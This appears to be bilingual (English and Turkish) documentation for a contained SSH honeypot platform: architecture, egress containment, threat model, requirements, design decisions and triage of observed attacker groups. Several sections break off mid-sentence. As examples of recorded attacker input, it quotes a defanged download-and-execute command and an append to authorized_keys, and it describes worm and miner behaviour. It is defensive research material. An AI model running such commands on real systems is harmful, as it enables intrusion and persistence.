entries.x: Contained SSH honeypot (Cowrie) with a FastAPI backend and a React SOC dashboard: command-level session recording, live terminal view and TTY replay, payload capture and static analysis, IP/ASN intelligence, evidence-based attack classification with MITRE ATT&CK mapping, and strict egress containment so the honeypot can never be used against third parties.

Honeypot: Cowrie 3.0.15 on tcp/22 (emulated shell, SCP/SFTP capture, TTY recordings). Collector: tails cowrie.json with offset persistence, rotation handling, idempotent ingest (deterministic event ids), dead-letter table for bad lines. Normalized model: sessions, auth attempts, commands, emulated processes, file operations, network intents, payloads, classifications, MITRE mappings, alerts (SQLite WAL, PostgreSQL-compatible schema, versioned migrations). Analysis: shell command parsing, incremental per-session detection (recon, credential access, persistence, download/execute chains, miners, lateral movement intents), confidence levels Suspected < Likely < Observed < Confirmed with evidence and event ids. Payloads: sha256, file type/MIME, printable strings (URLs, IPs and shell keywords ranked first), ELF/script metadata; bytes are read, never executed or served. IP intelligence: Team Cymru ASN/country via DNS, optional reverse DNS, optional local MaxMind-format database. API: REST + WebSocket (first-message JWT auth), public health and Prometheus metrics. Dashboard views: Overview (time range, KPI deltas, heatmap, funnel, world map, top lists), Live Attacks, Live Terminal, Sessions, Session detail, Session compare, IP Intel (activity, risk breakdown, same ASN, campaigns), Campaigns (including heuristic script clusters), New in range, Credentials, SSH fingerprints (HASSH, client versions), MITRE ATT&CK matrix, Alerts (search, bulk acknowledge, notes), Payloads (entropy, extra

Component Location Responsibility Cowrie /home/cowrie on the VM; config in deployment/cowrie/ Medium-interaction SSH honeypot. Emulates a Linux server; never executes attacker commands. Writes JSON events, TTY recordings and captured files. Collector backend/hpintel/collector.py Tails cowrie.json with a persisted offset (inode + byte offset in collector_state ), handles rotation (also during downtime), truncation, partial lines. Database outages never advance the offset; deterministic bad lines go to dead_letters . Normalizer backend/hpintel/normalize.py Maps Cowrie event ids to a stable event taxonomy ( connection.inbound , auth.failure , command.input , payload.upload , ...), validates fields, converts timestamps to UTC, assigns deterministic event ids (UUIDv5 of the raw line) for idempotent re-ingest. Store backend/hpintel/store.py One transaction per event. Raw event row first; primary rows (session, auth attempt, command) and derived rows (emulated processes, file operations, network activity, payload analysis, detection) in separate savepoints so analysis failures never lose raw telemetry. Command parser backend/hpintel/cmdparse.py Splits shell lines (quotes, pipes, separators, redirections, wrappers like sudo/nohup/busybox; leading flow words such as then / do / if / ! are dropped from a stage) into emulated processes, file operations and network intents. Results are labelled evidence="derived" . Detection backend/hpintel/detection.py Bounded regex rules plus contextua

Attacker types wget hxxp://x/b.sh; chmod +x b.sh; ./b.sh in the emulated shell. Cowrie writes cowrie.command.input to cowrie.json and output bytes to the session's ttylog. The download itself never succeeds: Cowrie refuses non-global addresses on its own (text log only, no JSON event; observed in the attack simulation), and any real connection attempt by uid cowrie is dropped by nftables. Shell redirections into files (e.g. echo ... >> ~/.ssh/authorized_keys ) are logged by Cowrie as cowrie.session.file_download with the written content. The TTY follower publishes the output frames to /ws subscribers (Live Terminal). The collector reads the line, the normalizer produces command.input , the store inserts events + commands , derives processes wget , chmod , ./b.sh , a file operation, a network intent ( attempted ), and runs detection: downloader (Likely), malware_deployment (Likely, chain), techniques T1105, T1222.002, T1059.004. Severe categories at confidence >= Likely raise a deduplicated alert (per session; a malware_deployment finding without a captured payload transfer and without a download -> execute chain, e.g. a chmod +x capability probe, raises a medium alert deduplicated per source IP and UTC day); event, session and alert messages are published to /ws . Every alert (detection, new_payload , disk usage) passes through store._alert , where the suppression rules of backend/hpintel/suppression.py (ADR 0013) can demote it (created at a lower severity, original kept) or

See docs/decisions/ for the full records. Summary: Containment by uid: the cowrie uid has no network egress at all (including loopback), at the cost of attacker downloads failing; payloads are still captured via SCP/SFTP uploads. SQLite (WAL) with a portable SQLAlchemy Core schema and a versioned migration runner, so PostgreSQL can be adopted later. Webhook alert notifications are opt-in, limited to one IPv4 address and port for uid hpintel , signed and never sent for the backlog; SMTP is deferred (ADR 0011).

Asset Why it matters Third parties on the internet The honeypot must never become an attack platform (scanning, brute force, proxying, malware distribution, DDoS). Host integrity (VM, LAN) Escape from the emulation or the backend would expose the LAN. Dashboard credentials and JWT secret Admin: read access to all telemetry plus alert acknowledgement and notes. Viewer (0.4.0, optional): read access to all telemetry. The JWT secret can mint tokens for either role. Captured telemetry and payloads Research value; payloads are live malware.

Automated internet attackers (botnets, scanners, credential stuffers): high volume, scripted commands, payload drops. Expected and welcome. Manual attackers who notice the emulation and try to break out of it, poison the telemetry, or attack the analysis pipeline through crafted input.

Availability: a watchdog restarts the honeypot if it stops responding (VALIDATED). Each restart drops open attacker sessions. Cowrie or Twisted vulnerabilities could give code execution as cowrie ; egress is still blocked for that uid, but local privilege escalation in the container is not prevented by this project. DNS egress remains open for non-honeypot users. The viewer role is read-only but sees all telemetry, including attacker credentials.

Only observed indicators are exported: source IPs of sessions started in the window, sha256 values of payloads seen in the window, and download URLs from those payload events (http, https, ftp, ftps, tftp; printable ASCII, at most 2048 characters). IoCs extracted from payload contents are not exported. A URL whose authority contains a backslash is dropped ( url_rejected ). Non-global IP addresses (private, loopback, link-local, documentation, ...; IPv4-mapped IPv6 is unwrapped first) and the networks in HPINTEL_IOC_EXCLUDE are always excluded, both as IPs and as URL hosts. URL hosts are checked after the userinfo is removed and one trailing dot is stripped; legacy numeric forms ( 127.1 , 2130706433 , 0x7f000001 , 0177.0.0.1 ) are decoded first, and localhost / *.localhost count as non-global. The JSON format reports the excluded counts and per type a truncated flag (limit reached) and a scan_capped flag (50000 rows read; the result may be partial). Every format is sent as an attachment ( hpintel-iocs-<until>.csv , .json or -stix.json ) with Cache-Control: no-store . CSV: a cell that starts with = , + , - , @ , TAB or CR gets a leading ' , so spreadsheet programs do not evaluate it as a formula. STIX 2.1: a bundle of indicator objects. Indicator ids are deterministic (uuid5 of the type and value). created and modified are the global first and last sighting of the indicator and the description holds no window-specific counts, so the same indicator is byte-identical in exports o

A heuristic grouping of sessions whose command sequences differ only in variable parts. Each of the first 500 commands of a closed session is normalised ( normalize_command_v1 ): whitespace collapsed; URLs (http, https, ftp, ftps, tftp) -> <URL> ; dotted IPv4 -> <IP> ; hex runs of >= 16 characters -> <HEX> ; base64-like runs of >= 24 characters (upper case, lower case and a digit) -> <B64> ; remaining digit runs of >= 4 -> <N> . sessions.command_norm_hash is the sha256 of "v1\n" plus the normalised commands joined by newlines, filled by the same background job as the exact command hash. The dashboard labels these groups "heuristic cluster".

Connect to ws://<host>:8000/ws (no token in the URL). Send as the first message within 5 s: {"type": "auth", "token": " [gizlendi] "} . Server replies {"type": "hello", "user": "<username>"} , otherwise closes with code 4401 . Admin and viewer tokens are accepted (the feed is read-only); a token whose account no longer matches the configuration is refused like an invalid one. Server pushes: - {"type": "event", "data": {event_id, timestamp, session_id, source, event_type, severity, src_ip, summary, data}} - {"type": "session", "data": <session row>} - {"type": "alert", "data": <alert row>} - {"type": "tty", "data": {"session_id", "frames": [{"t", "dir": "out|in", "data": <base64>, "ts"}]}} (merged frames, at most 256 KiB per message) - {"type": "ping"} every 25 s The server closes with 4401 when the token expires; slow clients (send blocked > 10 s) are disconnected.

Every HTTP response carries Content-Security-Policy ( default-src 'self' , frame-ancestors 'none' , ...), X-Frame-Options: DENY , X-Content-Type-Options: nosniff , Referrer-Policy: no-referrer ; /api/* responses also carry Cache-Control: no-store . No CORS headers are sent (same-origin only).

State: VALIDATED (WebSocket tty frames with an attacker-typed marker, 2026-10-07) Notes: Shall not depend on polling; shall use WebSocket or Server-Sent Events for low-latency updates.

State: VALIDATED (normalized events in SQLite with session correlation and UTC timestamps; not an append-only log file) Notes: Events shall include correlation IDs (session_id) and UTC timestamps.

Description: When an attacker attempts to download or upload a file via wget, curl, scp, sftp, echo, base64, or similar mechanisms, the system shall capture the file, compute its SHA256, record metadata (filename, size, source IP, session ID, download URL), and store it without executing it on the honeypot host. State: VALIDATED for SCP/SFTP uploads (sha256, type, strings); wget/curl downloads blocked by containment by design; entropy NOT IMPLEMENTED Notes: Captured payloads shall be stored in a quarantined directory; optional analysis may occur in a separate sandbox/container.

Description: For each unique source IP, the system shall maintain: IP, country, ASN, ISP/organization, reverse DNS, first seen, last seen, number of sessions, authentication attempts, successful sessions, commands executed, payloads, threat score, observed techniques. State: IMPLEMENTED (Team Cymru DNS, rDNS, optional MaxMind db); not validated with a public IP (only LAN traffic so far); no geolocation without a user-provided mmdb Notes: Shall use offline databases (e.g., MaxMind DB) or optional API integrations (no hard-coded API keys).

Description: The system shall automatically classify observed behaviors into categories: Reconnaissance, Port Scanning, SSH Brute Force, Credential Stuffing, Privilege Escalation, Persistence, Defense Evasion, Command Execution, Malware Download, Malware Execution, Cryptominer Deployment, Botnet Recruitment, Ransomware-like Activity, Web Exploitation, Lateral Movement Attempt, Data Exfiltration Attempt, Proxy/VPN Installation, IRC/C2 Behavior, DNS-related Activity, Suspicious File Activity. State: VALIDATED (classifications with confidence, evidence and MITRE mapping in the attack simulation) Notes: Classification shall be based on observed evidence only; confidence levels (High/Medium/Low) shall accompany each classification.

Description: Outbound network traffic from the honeypot shall be restricted by default-deny firewall rules. Only explicitly permitted outbound traffic (e.g., DNS to trusted resolvers, NTP, API calls to threat intelligence feeds if opt-in) shall be allowed. State: VALIDATED (uid cowrie egress, loopback and DNS blocked; forwarding refused; ip_forward 0; after reboot) Notes: Must prevent the honeypot from being used for: internet scanning, SSH brute force, DDoS, spam, malware propagation, credential attacks, proxying, C2 forwarding.

Description: A web dashboard shall provide: - Live attack metrics (events/min, unique source IPs, authentication attempts, successful logins, payloads captured, high-risk sessions) - World map of attacker origins (by country/ASN) - Live sessions table with threat levels - Terminal view for selected sessions - Event stream (real-time) - IP intelligence details - Attack timeline view - Payload repository with hash listings - Analytics over time (attacks/hour, unique IPs/day, top ASNs, top usernames, etc.) State: IMPLEMENTED (all views built and served, data verified through the API and WebSocket; no automated browser test) Notes: Dashboard shall not expose unnecessary gradients or generic SaaS styling; it shall favor a dark, technical, dense information architecture.

Description: The system shall expose a REST API for: - GET /api/sessions - GET /api/sessions/:id - GET /api/events - GET /api/events/live - GET /api/ip/:address - GET /api/payloads - GET /api/analytics - GET /api/threats Additionally, a WebSocket endpoint for live event streaming. State: VALIDATED (REST and WebSocket endpoints exercised; auth 401/4401) Notes: API shall require authentication (token-based) and shall not be exposed to the public internet without proper controls.

Description: The honeypot shall survive reboots via systemd services; shall perform health checks on startup; shall rotate logs; shall back up configuration and database; shall restore firewall rules. State: VALIDATED (reboot test 2026-10-07: services, firewall and data restored; collector resumed) Site note: a reboot of the production host was VALIDATED on 2026-10-10 (18:38 UTC) with release 0.2.x/0.3.0; a production reboot with release 0.3.1 and later is NOT RUN; scenario-based reboots were VALIDATED on disposable VMs. Notes: On boot, services shall start automatically; failure to start critical services shall trigger alerts.

entries.h: REQ-013 Security of the Platform Itself
entries.x: Description: The dashboard and API shall be protected against: authentication bypass, path traversal, command injection, SQL injection, XSS, CSRF, WebSocket privilege escalation. entries.h: REQ-014 Data Retention & Disk Usage Control
entries.x: Description: The system shall enforce retention policies for: raw events, sessions, payload metadata, payload binaries, analytics. Log rotation shall be enabled; disk usage monitoring shall trigger alerts when thresholds are approached. State: IMPLEMENTED (database retention and Cowrie file retention timer; unit tested, no prune observed on the VM yet) Notes: Older data may be archived or deleted according to policy.

Description: All timestamps shall be stored in UTC; the system shall use NTP for clock synchronization; logs shall be append-only where feasible; cryptographic hashing/chaining of log entries may be used for integrity verification. entries.p: ADR 0001: Cowrie as the SSH honeypot
entries.h: ADR 0001: Cowrie as the SSH honeypot
entries.x: Status: accepted (2026-10-05) Context: the platform needs command-level SSH/shell recording, TTY replay, file capture and JSON telemetry, with no real command execution. Alternatives were compared in docs/research/honeypot_comparison.md . Decision: Cowrie 3.0.15 (medium interaction, emulated shell, SFTP/SCP capture, JSON log, ttylog) in a dedicated venv under user cowrie . Consequences: realistic enough for automated attackers; detectable by skilled attackers (residual risk in THREAT_MODEL.md). Telnet disabled.

entries.p: ADR 0002: Cowrie binds tcp/22 directly with CAP_NET_BIND_SERVICE
entries.h: ADR 0002: Cowrie binds tcp/22 directly with CAP_NET_BIND_SERVICE
entries.x: Status: accepted (2026-10-06) Context: the first attempt ran cowrie start (daemonizing) under systemd Type=simple as non-root on port 22 and restart-looped more than 1500 times. A NAT redirect 22 -> 2222 adds a NAT table to the containment ruleset. Consequences: no NAT rules; Cowrie sees the real destination port; the unit is verified active with NRestarts=0.

entries.p: ADR 0003: Containment by uid, no honeypot egress at all
entries.h: ADR 0003: Containment by uid, no honeypot egress at all
entries.x: Status: accepted (2026-10-06) Context: "realism must never override containment". Allowing attacker downloads (even through a filtering proxy) risks fetching from or signalling to third parties. Cowrie's emulated wget/curl make real HTTP requests without a localhost check (verified in cowrie/commands/wget.py). Decision: nftables output policy drop; every new connection from uid cowrie is dropped, including loopback, before any accept rule; forward drop; ip_forward=0; Cowrie SSH forwarding disabled. Consequences: attacker downloads fail (recorded as failed download attempts and derived network intents); payloads are still captured when pushed by SCP/SFTP; proxy-abuse attempts are refused by Cowrie without a log event.

Status: accepted (2026-10-06) Decision: SQLAlchemy Core with portable types, ISO UTC timestamps as text, JSON as text, WAL mode, a versioned migration runner ( schema_migrations ). Deterministic event ids (UUIDv5 of the raw Cowrie line) make ingest idempotent. Consequences: single-file database, no extra service; moving to PostgreSQL is a HPINTEL_DATABASE_URL change plus driver (not yet tested).

entries.p: ADR 0005: FastAPI + WebSocket backend, React dashboard served by the backend
entries.h: ADR 0005: FastAPI + WebSocket backend, React dashboard served by the backend
entries.x: Status: accepted (2026-10-06) Decision: one Python process (FastAPI/uvicorn) runs the collector, enrichment, housekeeping, REST API, WebSocket and serves the built React (Vite, TypeScript) dashboard from the same origin. WebSocket auth uses a first message with the JWT (never the URL). No CORS. Consequences: one service to operate; the dashboard build happens on the workstation (no Node.js on the VM).

entries.p: ADR 0006: Offline release tarball with a wheelhouse
entries.h: ADR 0006: Offline release tarball with a wheelhouse
entries.x: Status: accepted (2026-10-06) Context: the VM has no outbound HTTP(S) for root after containment. Decision: build-release.sh builds the dashboard and downloads cp310 manylinux x86_64 wheels on the workstation, packs them with checksums; install.sh installs offline, keeps the previous release for rollback, generates secrets on the VM only. Consequences: workstation must match the VM's Python minor version and architecture; transitive dependencies are resolved at build time.

entries.p: ADR 0007: IP intelligence from DNS-based sources
entries.h: ADR 0007: IP intelligence from DNS-based sources
entries.x: Status: accepted (2026-10-06) Decision: Team Cymru IP-to-ASN DNS (ASN, prefix, country, registry, AS name), reverse DNS (switchable with HPINTEL_INTEL_RDNS_ENABLED because PTR queries reach attacker-controlled name servers), optional local MaxMind-format database for city/coordinates. No API keys. Results are labelled "external intelligence" and never treated as identity. Consequences: requires DNS egress for the backend; geolocation only with a user-provided mmdb file.

Status: accepted (2026-10-06) Decision: every derived fact carries evidence ( observed from Cowrie, derived from command parsing, external intelligence labelled separately). Classifications use the ordered vocabulary Suspected < Likely < Observed < Confirmed (definitions in DATA_MODEL.md); techniques record the confidence of the observation, categories the confidence of the intent. Confirmed requires a captured payload that is then executed in the same session. Alerts for severe categories require at least Likely. Every classification lists evidence strings and event ids.

entries.p: ADR 0010: Keep all captured logs for research (effectively unlimited retention)
entries.h: ADR 0010: Keep all captured logs for research (effectively unlimited retention)
entries.x: Status: accepted (2026-10-08) Context: honeypot-intelligence is an attack-intelligence research platform. The owner uses the captured data in scientific research and evaluations, where losing older sessions, events, payloads or raw Cowrie logs to automatic pruning would damage the dataset. The defaults prune data on two independent paths: Database rows: HPINTEL_RETENTION_*_DAYS (events 180, sessions 365, network 180, payloads 365) applied by backend/hpintel/housekeeping.py . Raw Cowrie files on disk: cowrie-retention.service (daily timer) deletes rotated JSON logs older than 30 days, TTY recordings older than 180 days and downloads older than 365 days. HPINTEL_RETENTION_*_DAYS has a minimum of 1 (0 or a disable sentinel is not supported), so "keep everything" is expressed as a very large number. Decision: retain all captured data effectively forever on both paths. Set every HPINTEL_RETENTION_*_DAYS to 36500 (about 100 years) in the production env file and in deployment/config/hpintel.env.example . Set every cowrie-retention.service window ( find -mtime +N ) to 36500 in the unit header and all three ExecStart lines, in deployment/systemd/cowrie-retention.service . The timer stays enabled so the mechanism remains in place and auditable; it simply never matches a file. Keep the disk-usage alerts active and unchanged ( HPINTEL_DISK_WARN_PERCENT 85, HPINTEL_DISK_CRITICAL_PERCENT 95). Ham honeypot olaylarının sınıflandırılmış, kanıta dayalı istihbarata dönüşümü - zenginleştirme kaynakları, güven modeli, MITRE eşlemesi ve planlanan itibar sorguları. Ham Cowrie olayları dört adımda istihbarata dönüşür: normalize et, türet, sınıflandır, zenginleştir. Türetilen her bilgi nereden geldiğini söyler.

Collector ve normalizer her olaya kararlı bir sınıflandırma ve deterministik bir kimlik verir. Komut ayrıştırıcı sonra yazılan komut satırından emüle süreçleri, dosya işlemlerini ve ağ niyetlerini türetir. ADR 0008 (kabul 2026-10-06, IMPLEMENTED): Güven Anlamı Suspected Zayıf veya tek bir gösterge. Likely Birkaç tutarlı gösterge veya doğrulanmamış güçlü bir gösterge. Observed Davranışın kendisi kaydedilen oturumda görüldü. Confirmed Yakalanan bir payload'ın aynı oturumda çalıştırılmasını gerektirir. Sözlük sıralıdır: Suspected < Likely < Observed < Confirmed (tanımlar DATA_MODEL.md içindedir). Teknikler gözlemin güvenini, kategoriler niyetin güvenini kaydeder. Ciddi kategoriler için alarm en az Likely gerektirir ve her sınıflandırma kanıt dizgilerini ve olay kimliklerini listeler; böylece analist bir kararı her zaman ham olaylara kadar izleyebilir.

Tespit kuralları ve komut ayrıştırıcı davranışı tekniklere eşler; örneğin T1082 sistem bilgisi keşfi, T1105 araç aktarımı (ingress tool transfer), T1059.004 Unix kabuğu, T1222.002 dosya izni değiştirme, T1098.004 SSH authorized keys, T1070 gösterge silme ve T1496 kaynak kaçırma. Botlar bağlantı başına tek deneme yaptığından, kaynak başına kimlik bilgisi teknikleri (T1110.001 tahmin, T1110.003 püskürtme) oturum başına değil bir housekeeping işiyle toplulaştırılır. Eşikler varsayımlar kaydında belgelenmiş varsayımlardır. Bir kural değişikliğinden sonra saklı oturumlar için teknik satırları yeniden türetilebilir ( redetect-techniques ); bu işlem 2026-10-16'da üretimde bir kez yapıldı ve alarm sayısını değiştirmedi (MEASURED). Canlı teknik tablosu Göstergeler sayfasındadır.

ADR 0007 (kabul 2026-10-06, IMPLEMENTED): DNS üzerinden Team Cymru IP-ASN verisi: ASN, önek, ülke, kayıt otoritesi, AS adı. API anahtarı yok. Ters DNS, açılıp kapatılabilir; çünkü PTR sorguları saldırganların kontrol ettiği ad sunucularına ulaşır. Şehir ve koordinatlar için operatörün sağladığı isteğe bağlı yerel MaxMind biçimli veritabanı. Sonuçlar "harici istihbarat" olarak etiketlenir ve asla kimlik olarak ele alınmaz.

Yüklenen dosyalar SHA256 ile özetlenir, sihirli baytlarla türlendirilir, ölçülür (boyut, entropi) ve URL'ler, IP'ler ve kabuk anahtar sözcükleri öne alınarak yazdırılabilir dizgiler taranır. ELF üst bilgileri ayrıştırılır. Aynı baş özetini paylaşan dosyalar, tek bir ikili dosyanın kesik kopyalarını bulmak için bayt bayt doğrulanır. Dosyalar yalnızca okunur: asla çalıştırılmaz, API tarafından sunulmaz, kaynak denetimine eklenmez.

Alarmların önem dereceleri vardır; aranabilir, toplu onaylanabilir ve not eklenebilir; bilinen gürültü bastırma kurallarıyla düşürülebilir veya gizlenebilir. İsteğe bağlı webhook, Telegram ve e-posta kanalları, kanal başına eşiğin üzerindeki alarmları hız sınırlarıyla ve isteğe bağlı bir özetle iletir ( ADR 0011 , ADR 0015 ). Üretim ana makinesinde bu kanallar yapılandırılmamıştır (durum 2026-10-16).

Durum: yayımlanmadı . ADR 0018, 0.6.0 çalışması için 2026-10-16'da kabul edildi. Çıkış ve yapılandırma temeli ile Shodan InternetDB için bir pilot istemci bir çalışma dalında IMPLEMENTED durumdadır ve yalnızca yerel sahte sunuculara karşı birim testinden geçmiştir; bir VM'de veya gerçek bir sağlayıcıya karşı gözden geçirme ve doğrulama NOT VERIFIED'dır. AbuseIPDB, GreyNoise, URLhaus ve VirusTotal istemcileri PLANNED'dır. Tasarım özeti: Sabit beş sağlayıcı; ana makine adları kodda sabittir, dolayısıyla operatör bir sağlayıcıyı başka yere yönlendiremez. Her sağlayıcı yalnızca arka uç kullanıcısı için kendi açık güvenlik duvarı kuralını gerektirir (bir ila dört sabitlenmiş IPv4 adresi, tek port). Anahtarlar yoksa kural kümesi değişmez. Bağlantılar, gerçek ana makine adına karşı sertifika doğrulamasıyla sabitlenmiş adreslere yapılır; yönlendirme yok, proxy yok, 64 KiB yanıt sınırı, sağlayıcı başına günlük ve dakikalık kotalar, hız sınırında kalıcı duraklatma. Bir operatör komutu sabitlenmiş adresleri güncel DNS yanıtlarıyla karşılaştırır; güvenlik duvarını hiçbir şey otomatik yenilemez. Sonuçlar yalnızca bilgilendiricidir: risk puanını değiştirmez, alarm üretmez veya bastırmaz, IoC dışa aktarımına girmez. Pilot hiçbir zaman "malicious" kararı vermez; çünkü maruziyet verisi saldırgan kararı değildir. Bir saldırgan adresini üçüncü tarafa göndermek araştırma ilgisini ifşa etmektir; bu yüzden sağlayıcı başına isteğe bağlıdır ve operatör sağlayıcı şartlarını denetlemelidir. Sağlayıcı

entries.h: Grup B - Go SSH yükleyici yetenek yoklaması
entries.x: SSH-2.0-Go bildiren bir istemci yaygın parolalarla root olarak oturum açar ve tek bir sabit dizi çalıştırır: PATH ayarlar, uname ile sistemi profiller, sonra bir işaretçi yazdıran küçük bir betik yazar, çalıştırılabilir yapar, çalıştırır ve siler. Bu bir yükleyici için ön kontroldür, kötü amaçlı yazılım değildir; gerçek ikinci aşama yalnızca yoklama başarılı olursa indirilirdi ve hiç indirilmedi. Komut dizisi oturumlar arasında bayt bayt aynıdır (tek bir komut özeti). Keşif ve indir/çalıştır örüntüsüne eşlenir; MITRE T1082, T1222.002, T1059.004. Birkaç barındırma ağındaki çok sayıda adresten görüldü; 2026-10-11 itibarıyla yoklama özeti, 2026-10-07 ile 2026-10-11 arasında tek bir ASN'nin 11 adresinden 87 oturumda göründü (MEASURED). Tespit fazla alarm üretti: high önem derecesi ve oturum başına tekilleştirmeyle bu tek yoklama, 2026-10-10'da açık alarmların yaklaşık %90'ını üretti. Yanıt ayarlama oldu ( medium önem derecesi, adres ve gün başına tekilleştirme, 2026-10-10) ve sonra bilinen yoklamayı low 'a düşüren bir başlangıç bastırma kuralı (0.5.0).

entries.h: Grup C - SSH yayılma solucanı, anahtar ve yapılandırma bırakma
entries.x: SSH-2.0-Go bir istemci varsayılan bir kimlik bilgisi çiftiyle oturum açtı ve iki dosya bıraktı: izin verici bir SSH istemci yapılandırması (ana makine anahtarı denetimi kapalı) ve bir SSH özel anahtarı. Bu, dota/outlaw ailesi SSH solucanlarının klasik örüntüsüdür: bırakılan anahtar ve yapılandırma, ele geçirilmiş bir makinenin etkileşimsiz olarak başka hedeflere ulaşmasını sağlar. MITRE T1105, T1098.004, T1021.004. Aynı kaynak aynı tek satırlık anahtar bırakma ile dört kez daha geldi (2026-10-08 ile 2026-10-10 arası). Honeypot'un varsayılan olarak her şeyi engelleyen çıkışı her türlü yayılmayı önledi ; bu, kısıtlama tasarımının gerçek dünyadaki en net doğrulamasıdır. Anahtar içeriği bilerek yeniden üretilmemiştir.

entries.h: Grup D - sshd adlı SFTP yüklemesi (madenci yapılandırmalı Go SSH solucanı)
entries.x: Çin, Hindistan ve başka yerlerdeki birkaç kaynak, kaba kuvvetle oturum açtı, SFTP üzerinden sshd adlı bir dosya yükledi ve çoğunlukla hiç komut çalıştırmadı (biri chmod +x ve nohup çalıştırdı; bunlar yalnızca emülasyon içinde çalıştı). 2026-10-10 ve 2026-10-15 triyajları şunları buldu: Yakalanan tüm kopyalar, farklı özetlere rağmen tek bir ikili dosyanın bayt öneklerdir; farklı SHA256 değerleri kesilmenin (20 MiB yükleme sınırı veya oturumun kopması) bir yan ürünüdür. Şimdiye kadarki en uzun kopya yaklaşık 30 MB'tır. ELF 64-bit x86-64, bir Go programı; dizgi göstergeleri arasında kimlik bilgilerinden oluşan bir saldırı kuyruğu, bir SFTP kütüphanesi, bir PAM kütüphanesi referansı, sistem bilgisi kütüphaneleri, bir madencilik yapılandırma yapısı (algoritma, havuz adresi, havuz kullanıcısı ve parolası, NiceHash bayrağı), genel IP sorgu servisleri ve raporlama için bir sohbet servisi webhook'u vardır.
